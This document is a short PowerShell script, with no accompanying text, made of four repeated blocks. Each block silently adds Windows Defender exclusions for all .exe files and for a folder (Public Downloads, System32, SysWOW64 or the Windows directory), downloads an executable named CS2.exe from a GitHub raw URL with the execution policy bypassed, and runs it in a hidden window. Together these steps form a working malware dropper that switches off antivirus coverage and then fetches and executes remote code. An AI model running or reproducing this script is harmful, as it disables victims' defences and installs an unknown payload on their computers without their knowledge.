powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension '.exe'"
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\Downloads'"
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2.exe' -OutFile 'C:\Users\Public\Downloads\CS2.exe'"
Start-Process "C:\Users\Public\Downloads\CS2.exe" -WindowStyle Hidden

powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension '.exe'"
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Windows\System32'"
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2.exe' -OutFile 'C:\Windows\System32\CS2.exe'"
Start-Process "C:\Windows\System32\CS2.exe" -WindowStyle Hidden

powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension '.exe'"
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Windows\SysWOW64'"
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2.exe' -OutFile 'C:\Windows\SysWOW64\CS2.exe'"
Start-Process "C:\Windows\SysWOW64\CS2.exe" -WindowStyle Hidden

powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension '.exe'"
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Windows'"
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2.exe' -OutFile 'C:\Windows\CS2.exe'"
Start-Process "C:\Windows\CS2.exe" -WindowStyle Hidden